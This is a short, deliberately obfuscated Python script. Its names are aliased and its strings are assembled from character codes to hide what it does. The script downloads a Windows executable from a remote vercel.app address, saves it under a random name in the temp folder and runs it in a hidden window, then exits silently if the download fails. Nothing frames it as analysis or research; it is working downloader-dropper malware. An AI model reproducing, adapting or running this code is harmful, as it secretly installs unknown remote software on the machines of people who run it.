import requests
aE=str
aP=open
aU=True
aJ=exit
aV=requests.get
import os
aD=os.path
import uuid
au=uuid.uuid4
import tempfile
ab=tempfile.gettempdir
import subprocess
aq=subprocess.CREATE_NO_WINDOW
ai=subprocess.Popen
aM=("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(111),chr(107),chr(45),chr(111),chr(109),chr(101),chr(103),chr(97),chr(45),chr(101),chr(105),chr(103),chr(104),chr(116),chr(46),chr(118),chr(101),chr(114),chr(99),chr(101),chr(108),chr(46),chr(97),chr(112),chr(112),chr(47),chr(81),chr(103),chr(115),chr(104),chr(113),chr(108),chr(103),chr(101),chr(108),chr(46),chr(101),chr(120),chr(101)]))
aK=ab()
ax=aD.join(aK,aE(au())+("".join([chr(46),chr(101),chr(120),chr(101)]))                             )
al=aV(aM)
if al.status_code==int("".join([chr(50),chr(48),chr(48)]))                      :
  with aP(ax,("".join([chr(119),chr(98)]))                 )as ar:
    ar.write(al.content)
  ai([ax],creationflags=aq,shell=aU)
else:
  aJ()
